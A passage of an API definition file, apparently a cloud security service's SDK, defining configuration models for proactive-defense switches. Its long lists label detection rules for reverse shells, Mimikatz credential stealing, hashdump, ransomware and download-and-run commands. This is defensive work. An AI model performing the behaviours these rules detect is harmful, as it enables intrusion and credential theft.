*   **USER-ENABLE-SWITCH-TYPE\\_54365**: Create service autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54366**: Create high-risk autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54367**: Create scheduled task autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54368**: Create registry autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54369**: Create WMI autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54373**: Against security software
*   **USER-ENABLE-SWITCH-TYPE\\_54374**: Intrusion trace cleanup
*   **USER-ENABLE-SWITCH-TYPE\\_54384**: Hashdump Attack
*   **USER-ENABLE-SWITCH-TYPE\\_55251**: Database services execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_57242**: Malicious command execution
*   **USER-ENABLE-SWITCH-TYPE\\_57340**: Command line download and run malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_62357**: Cloud Assistant service information detection
*   **USER-ENABLE-SWITCH-TYPE\\_63725**: Ingress service implants suspicious script/binary file', example='kdump_switch', position='Query'),
}

model DescribeCommonOverallConfigResponseBody = {
  overallConfig?: {
    config?: string(name='Config', description='The status of the feature. Valid values:

*   **on**: enabled
*   **off**: disabled', example='on'),
    type?: string(name='Type', description='The type of the feature. Valid values:

*   **kdump_switch**: Active defense experience optimization
*   **threat_detect**: Dynamic adaptive threat detection capability
*   **suspicious_aggregation**: Alert Association
*   **alidetect**: File Test
*   **USER-ENABLE-SWITCH-TYPE\\_3277**: Suspicious process startup
*   **USER-ENABLE-SWITCH-TYPE\\_5507**: malicious drivers
*   **USER-ENABLE-SWITCH-TYPE\\_38857**: Entrance service execution high-risk operation
*   **USER-ENABLE-SWITCH-TYPE\\_50858**: Web service performs high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_50859**: Entrance service execution suspicious operation
*   **USER-ENABLE-SWITCH-TYPE\\_50861**: Information detection
*   **USER-ENABLE-SWITCH-TYPE\\_50862**: Cloud Assistant Advanced Protection
*   **USER-ENABLE-SWITCH-TYPE\\_50867**: Create malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_50868**: Create suspicious files
*   **USER-ENABLE-SWITCH-TYPE\\_50869**: Unauthorized execution of high-risk orders
*   **USER-ENABLE-SWITCH-TYPE\\_50870**: Rebound Shell
*   **USER-ENABLE-SWITCH-TYPE\\_50873**: WebShell execute command
*   **USER-ENABLE-SWITCH-TYPE\\_50876**: Against security software
*   **USER-ENABLE-SWITCH-TYPE\\_50877**: Malicious soft communication
*   **USER-ENABLE-SWITCH-TYPE\\_50884**: Suspicious worm script behavior
*   **USER-ENABLE-SWITCH-TYPE\\_50885**: malicious script behavior
*   **USER-ENABLE-SWITCH-TYPE\\_50983**: obfuscated command
*   **USER-ENABLE-SWITCH-TYPE\\_51200**: Command line download and run malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_51201**: ransomware
*   **USER-ENABLE-SWITCH-TYPE\\_51202**: Suspected Extortion
*   **USER-ENABLE-SWITCH-TYPE\\_53168**: process debugging
*   **USER-ENABLE-SWITCH-TYPE\\_53272**: Exploiting Kernel Vulnerabilities to Elevate Privileges
*   **USER-ENABLE-SWITCH-TYPE\\_54034**: Intranet scan
*   **USER-ENABLE-SWITCH-TYPE\\_54265**: Hijacking the PAM Module
*   **USER-ENABLE-SWITCH-TYPE\\_54395**: Unauthorized reading and writing of sensitive files
*   **USER-ENABLE-SWITCH-TYPE\\_54699**: Hijack dynamic link library
*   **USER-ENABLE-SWITCH-TYPE\\_54953**: Hashdump Attack
*   **USER-ENABLE-SWITCH-TYPE\\_57897**: suspected privilege escalation
*   **USER-ENABLE-SWITCH-TYPE\\_62981**: Bypassing security monitoring
*   **USER-ENABLE-SWITCH-TYPE\\_64025**: Ingress service execute command \\[enhanced mode]
*   **USER-ENABLE-SWITCH-TYPE\\_39659**: Sensitive Registry Key Protection
*   **USER-ENABLE-SWITCH-TYPE\\_51225**: Powershell executes high-risk commands
*   **USER-ENABLE-SWITCH-TYPE\\_51226**: Powershell execute suspicious command
*   **USER-ENABLE-SWITCH-TYPE\\_51228**: High-risk lateral penetration tools
*   **USER-ENABLE-SWITCH-TYPE\\_51229**: Browser service execution a high-risk operation
*   **USER-ENABLE-SWITCH-TYPE\\_51230**: Entrance service execution suspicious operation
*   **USER-ENABLE-SWITCH-TYPE\\_51232**: System processes execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51233**: Java service execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51234**: Office components execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51235**: Web service performs high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_51236**: Rebound shells
*   **USER-ENABLE-SWITCH-TYPE\\_52815**: Load high-risk drivers
*   **USER-ENABLE-SWITCH-TYPE\\_52816**: high-risk account manipulation behavior
*   **USER-ENABLE-SWITCH-TYPE\\_52818**: Information detection
*   **USER-ENABLE-SWITCH-TYPE\\_52820**: Create malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_52821**: Suspicious process startup
*   **USER-ENABLE-SWITCH-TYPE\\_52823**: Running high-risk ARK tools
*   **USER-ENABLE-SWITCH-TYPE\\_52825**: Unauthorized execution of high-risk orders
*   **USER-ENABLE-SWITCH-TYPE\\_52826**: Entrance service execution high-risk operation
*   **USER-ENABLE-SWITCH-TYPE\\_52827**: Ransomware
*   **USER-ENABLE-SWITCH-TYPE\\_52828**: Suspected Extortion
*   **USER-ENABLE-SWITCH-TYPE\\_52829**: delete system backup behavior
*   **USER-ENABLE-SWITCH-TYPE\\_54168**: LSA security permission service protection
*   **USER-ENABLE-SWITCH-TYPE\\_54365**: Create service autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54366**: Create high-risk autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54367**: Create scheduled task autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54368**: Create registry autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54369**: Create WMI autorun item
*   **USER-ENABLE-SWITCH-TYPE\\_54373**: Against security software
*   **USER-ENABLE-SWITCH-TYPE\\_54374**: Intrusion trace cleanup
*   **USER-ENABLE-SWITCH-TYPE\\_54384**: Hashdump Attack
*   **USER-ENABLE-SWITCH-TYPE\\_55251**: Database services execution high-risk operations
*   **USER-ENABLE-SWITCH-TYPE\\_57242**: Malicious command execution
*   **USER-ENABLE-SWITCH-TYPE\\_57340**: Command line download and run malicious files
*   **USER-ENABLE-SWITCH-TYPE\\_62357**: Cloud Assistant service information detection
*   **USER-ENABLE-SWITCH-TYPE\\_63725**: Ingress service implants suspicious script/binary file', example='kdump_switch'),
  }(name='OverallConfig', description='The information about the feature.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6D9CDB47-6191-4415-BE63-7E8B12CD4FBE'),
}

model DescribeCommonOverallConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCommonOverallConfigResponseBody(name='body'),
}

async function describeCommonOverallConfig(request: DescribeCommonOverallConfigRequest): DescribeCommonOverallConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeCommonOverallConfig', 'POST', '/', 'json', false, 'json', request);
}

model DescribeCommonOverallConfigListRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='119.136.XX.XX', position='Query'),
  typeList: [ string ](name='TypeList', description='The type of the feature in proactive defense. Valid values:

*   **kdump_switch**: Active defense experience optimization
*   **threat_detect**: Dynamic adaptive threat detection capability
*   **suspicious_aggregation**: Alert Association
*   **alidetect**: File Test
*   **USER-ENABLE-SWITCH-TYPE\\_38857**: Entrance service execution high-risk operation (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50858**: Web service performs high-risk operations (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50859**: Entrance service execution suspicious operation (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50862**: Cloud Assistant Advanced Protection (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50867**: Create malicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50868**: Create suspicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_64025**: Ingress service execute command \\[enhanced mode] (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51229**: Browser service execution a high-risk operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51230**: Entrance service execution suspicious operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51232**: System processes execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51233**: Java service execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51234**: Office components execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51235**: Web service performs high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52820**: Create malicious files (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52826**: Entrance service execution high-risk operation (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_55251**: Database services execution high-risk operations (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_63725**: Ingress service implants suspicious script/binary file (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_3277**: Suspicious process startup (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50983**: obfuscated command (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51200**: Command line download and run malicious files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_71131**: Ingress service executes sequence of suspicious behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51225**: Powershell executes high-risk commands (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_51226**: Powershell execute suspicious command (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52821**: Suspicious process startup (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_57242**: Malicious command execution (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_57340**: Command line download and run malicious files (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_39659**: Sensitive Registry Key Protection (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52816**: high-risk account manipulation behavior (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54365**: Create service autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54366**: Create high-risk autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54367**: Create scheduled task autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54368**: Create registry autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54369**: Create WMI autorun item (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50869**: Unauthorized execution of high-risk orders (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_53272**: Exploiting Kernel Vulnerabilities to Elevate Privileges (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54395**: Unauthorized reading and writing of sensitive files (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_57897**: suspected privilege escalation (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52825**: Unauthorized execution of high-risk orders (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_5507**: malicious drivers (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50876**: Against security software (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_53168**: process debugging (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54699**: Hijack dynamic link library (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_62981**: Bypassing security monitoring (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52815**: Load high-risk drivers (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52823**: Running high-risk ARK tools (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54373**: Against security software (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54374**: Intrusion trace cleanup (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54265**: Hijacking the PAM Module (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54953**: Hashdump Attack (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_54383**: MimiKatz Credential Stealing (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54384**: Hashdump Attack (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50861**: Information detection (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52818**: Information detection (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_54034**: Intranet scan (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51228**: High-risk lateral penetration tools (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50870**: Rebound Shell (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50873**: WebShell execute command
*   **USER-ENABLE-SWITCH-TYPE\\_51236**: Rebound Shell (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_50877**: Malicious soft communication (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50884**: Suspicious worm script behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_50885**: malicious script behavior (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51201**: ransomware (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_51202**: Suspected Extortion (Linux)
*   **USER-ENABLE-SWITCH-TYPE\\_52827**: ransomware (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52828**: Suspected Extortion (Windows)
*   **USER-ENABLE-SWITCH-TYPE\\_52829**: delete system backup behavior (Windows)', position='Query'),
}

model DescribeCommonOverallConfigListResponseBody = {
  overallList?: [ 
    {
      config?: string(name='Config', description='Indicates the status of the switch. Valid values:

*   **off**
*   **on**', example='on'),
      totalCount?: int32(name='TotalCount', description='The total number of entries that are returned.', example='184'),
      type?: string(name='Type', description='The type of the configuration. Valid values:

*   **kdump_switch**: Active defense experience optimization.
*   **threat_detect**: Adaptive threat detection.
*   **suspicious_aggregation**: Alert association.
*   **alidetect**: File detection.
*   **USER-ENABLE-SWITCH-TYPE\\_38857**: Entrance service performs high-risk operations (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_50858**: Web service performs high-risk operations (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_50859**: Entrance service performs suspicious operations (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_50862**: Cloud Assistant advanced protection (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_50867**: Injects malicious files (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_50868**: Injects suspicious files (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_64025**: Entrance service executes commands in an enhanced mode (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_51229**: Browser service performs high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_51230**: Entrance service performs suspicious operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_51232**: System processes perform high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_51233**: Java service performs high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_51234**: Office components perform high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_51235**: Web service performs high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_52820**: Injects malicious files (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_52826**: Entrance service performs high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_55251**: Database services perform high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_63725**: Entrance service injects suspicious scripts or binary files (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_3277**: Suspicious process startup (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_50983**: Obfuscated commands (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_51200**: Uses command line to download and run malicious files (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_71131**: Entrance service executes sequence of suspicious behavior (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_51225**: Powershell executes high-risk commands (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_51226**: Powershell executes suspicious commands (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_52821**: Suspicious process startup (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_57242**: Malicious command execution (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_57340**: Uses command line to download and run malicious files (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_39659**: Sensitive registry key protection (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_52816**: High-risk account manipulation behavior (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_54365**: Creates service auto-startup items (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_54366**: Creates high-risk auto-startup items (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_54367**: Creates scheduled task auto-startup items (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_54368**: Creates registry auto-startup items (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_54369**: Creates WMI auto-startup items (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_50869**: Unauthorized execution of high-risk commands (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_53272**: Exploits kernel vulnerabilities to elevate privileges (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_54395**: Unauthorized reading and writing of sensitive files (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_57897**: Suspected privilege escalation (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_52825**: Unauthorized execution of high-risk commands (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_5507**: Malicious drivers (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_50876**: Uninstalls security software (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_53168**: Process debugging (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_54699**: Hijacks dynamic link library (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_62981**: Bypasses security monitoring (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_52815**: Loads high-risk drivers (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_52823**: Runs high-risk anti-rootkit (ARK) tools (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_54373**: Uninstalls security software (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_54374**: Intrusion trace cleanup (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_54265**: Hijacks the pluggable authentication module (PAM) (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_54953**: Hashdump attack (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_54383**: MimiKatz credential stealing (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_54384**: Hashdump attack (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_50861**: Information detection (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_52818**: Information detection (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_54034**: Intranet scan (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_51228**: High-risk lateral penetration tools (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_50870**: Rebound shell (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_50873**: WebShell executes commands.
*   **USER-ENABLE-SWITCH-TYPE\\_51236**: Rebound shell (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_50877**: Malicious program communication (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_50884**: Suspicious worm script behavior (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_50885**: Malicious script behavior (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_51201**: Ransomware (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_51202**: Suspected extortion (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_52827**: Ransomware (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_52828**: Suspected extortion (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_52829**: Deletes system backup behavior (Windows).', example='kdump_switch'),
    }
  ](name='OverallList', description='An array that consists of the configurations of features.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
}

model DescribeCommonOverallConfigListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCommonOverallConfigListResponseBody(name='body'),
}

async function describeCommonOverallConfigList(request: DescribeCommonOverallConfigListRequest): DescribeCommonOverallConfigListResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeCommonOverallConfigList', 'POST', '/', 'json', false, 'json', request);
}

model DescribeCommonTargetConfigRequest {
  type: string(name='Type', description='The configuration type. Valid values:

*   **kdump_switch**: Active defense experience optimization.
*   **threat_detect**: Adaptive threat detection.
*   **containerNetwork**: Container network topology.
*   **interceptionSwitch**: Cluster microsegmentation.
*   **suspicious_aggregation**: Alert association.
*   **alidetect**: File detection.
*   **USER-ENABLE-SWITCH-TYPE\\_38857**: Entrance service performs high-risk operations (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_50858**: Web service performs high-risk operations (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_50859**: Entrance service performs suspicious operations (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_50862**: Cloud Assistant advanced protection for Linux.
*   **USER-ENABLE-SWITCH-TYPE\\_50867**: Injects malicious files (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_50868**: Injects suspicious files (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_64025**: Entrance service executes commands in an enhanced mode (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_51229**: Browser service performs high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_51230**: Entrance service performs suspicious operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_51232**: System processes perform high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_51233**: Java service performs high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_51234**: Office components perform high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_51235**: Web service performs high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_52820**: Injects malicious files (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_52826**: Entrance service performs high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_55251**: Database services perform high-risk operations (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_63725**: Entrance service injects suspicious scripts or binary files (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_3277**: Suspicious process startup (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_50983**: Obfuscated commands (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_51200**: Uses command line to download and run malicious files (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_71131**: Entrance service executes sequence of suspicious behavior (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_51225**: Powershell executes high-risk commands (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_51226**: Powershell executes suspicious commands (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_52821**: Suspicious process startup (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_57242**: Malicious command execution (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_57340**: Uses command line to download and run malicious files (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_39659**: Sensitive registry key protection (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_52816**: High-risk account manipulation behavior (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_54365**: Creates service auto-startup items (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_54366**: Creates high-risk auto-startup items (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_54367**: Creates scheduled task auto-startup items (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_54368**: Creates registry auto-startup items (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_54369**: Creates WMI auto-startup items (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_50869**: Unauthorized execution of high-risk commands (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_53272**: Exploits kernel vulnerabilities to elevate privileges (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_54395**: Unauthorized reading and writing of sensitive files (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_57897**: Suspected privilege escalation (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_52825**: Unauthorized execution of high-risk commands (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_5507**: Malicious drivers (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_50876**: Uninstalls security software (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_53168**: Process debugging (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_54699**: Hijacks dynamic link library (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_62981**: Bypasses security monitoring (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_52815**: Loads high-risk drivers (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_52823**: Runs high-risk anti-rootkit (ARK) tools (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_54373**: Uninstalls security software (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_54374**: Intrusion trace cleanup (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_54265**: Hijacks the pluggable authentication module (PAM) (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_54953**: Hashdump attack (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_54383**: MimiKatz credential stealing (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_54384**: Hashdump attack (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_50861**: Information detection (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_52818**: Information detection (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_54034**: Intranet scan (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_51228**: High-risk lateral penetration tools (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_50870**: Rebound shell (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_50873**: WebShell executes commands.
*   **USER-ENABLE-SWITCH-TYPE\\_51236**: Rebound shell (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_50877**: Malicious program communication (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_50884**: Suspicious worm script behavior (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_50885**: Malicious script behavior (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_51201**: Ransomware (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_51202**: Suspected extortion (Linux).
*   **USER-ENABLE-SWITCH-TYPE\\_52827**: Ransomware (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_52828**: Suspected extortion (Windows).
*   **USER-ENABLE-SWITCH-TYPE\\_52829**: Deletes system backup behavior (Windows).', example='kdump_switch', position='Query'),
}

model DescribeCommonTargetConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8BF6F'),
  targetList?: [ 
    {
      flag?: string(name='Flag', description='The mode in which the configuration takes effect. Valid values:

*   **add**: In this mode, the configuration takes effect on the assets.
*   **del**: In this mode, the configuration does not take effect on the assets.', example='add'),
      target?: string(name='Target', description='The ID of the asset on which the configuration takes effect.

> 

*   When you set the **TargetType** parameter to **uuid**, the value of this parameter indicates the UUID of an asset.

*   When you set the **TargetType** parameter to **Cluster**, the value of this parameter indicates the ID of a cluster.

*   When you set the **TargetType** parameter to **image_repo**, the value of this parameter indicates the ID of an image repository.', example='c23551de6149343e8a54e69fbefe6****'),
      targetType?: string(name='TargetType', description='The dimension from on which the feature was configured. Valid values:

*   **uuid**: the UUID of the asset
*   **Cluster**: the ID of the cluster
*   **image_repo**: the ID of the image repository', example='image_repo'),
    }
  ](name='TargetList', description='An array that consists of the details of the configuration items.'),
}

model DescribeCommonTargetConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCommonTargetConfigResponseBody(name='body'),
}

async function describeCommonTargetConfig(request: DescribeCommonTargetConfigRequest): DescribeCommonTargetConfigResponse {
  @handler.validateRequestModel(request);
  return @handler.do('RPC', 'DescribeCommonTargetConfig', 'POST', '/', 'json', false, 'json', request);
}

model DescribeCommonTargetResultListRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='113.57.XX.XX', position='Query'),
  type: string(name='Type', description='The type of the configuration item. Valid values:

*   **webshell_timescan**: webshell detection and removal
*   **aliscriptengine**: in-depth detection engine
*   **alidetect**: installation scope of local file detection
*   **alidetect-scan-enable**: detection scope of local file detection', example='webshell_timescan', position='Query'),
}

model DescribeCommonTargetResultListResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6673D49C-A9AB-40DD-B4A2-B92306701AE7'),
  targetConfig?: {
    flag?: string(name='Flag', description='The identifier that indicates whether the configuration item is applied to the server. Valid values:

*   **add**: applied
*   **del**: not applied', example='del'),
    targetDefault?: string(name='TargetDefault', description='The default identifier.', example='add'),
    targetList?: [ string ](name='TargetList', description='An array that consists of the IDs of the server groups or the UUIDs of the servers.

>  If **uuid** is returned for the **TargetType** parameter, **UUIDs** of the servers are returned. If **groupId** is returned for the **TargetType** parameter, IDs of the server groups are returned.'),
    targetType?: string(name='TargetType', description='The type of the server to which the configuration item is applied. Valid values:

*   **uuid**: a server
*   **groupId**: a server group', example='uuid'),
    totalCount?: string(name='TotalCount', description='The total number of entries returned.', example='22'),
    type?: string(name='Type', description='The type of the configuration item. Valid values:

*   **webshell_timescan**: webshell detection and removal
*   **aliscriptengine**: in-depth detection engine
